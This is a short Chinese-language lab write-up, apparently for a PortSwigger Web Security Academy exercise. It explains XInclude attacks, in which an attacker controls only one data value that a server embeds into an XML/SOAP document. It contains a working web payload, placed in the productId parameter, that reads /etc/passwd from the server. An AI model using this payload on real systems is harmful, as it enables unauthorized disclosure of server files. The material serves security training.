库存检索按钮抓包

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/XXE/images/8DC481D7172240C6BE8C71AD5EC9B258clipboard.png)

没有xml格式数据，此时也可能存在xxe漏洞

检测poc:

```javascript
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
&storeId=1
```



poc解释：

# XInclude攻击

一些应用程序接收客户端提交的数据，将其在服务器端嵌入到XML文档中，然后解析该文档。将客户端提交的数据放入后端SOAP请求中，然后由后端SOAP服务处理该请求时，就会发生这种情况。

在这种情况下，您无法进行经典的XXE攻击，因为您无法控制整个XML文档，因此无法定义或修改DOCTYPE元素。

但是，您也许可以XInclude代替使用。XInclude是XML规范的一部分，该规范允许从子文档构建XML文档。您可以XInclude在XML文档中的任何数据值内进行攻击，因此可以在仅控制放置在服务器端XML文档中的单个数据项的情况下执行攻击。

要进行XInclude攻击，您需要引用XInclude名称空间并提供要包含的文件的路径。例如：

<foo xmlns:xi="http://www.w3.org/2001/XInclude">

<xi:include parse="text" href="file:///etc/passwd"/></foo>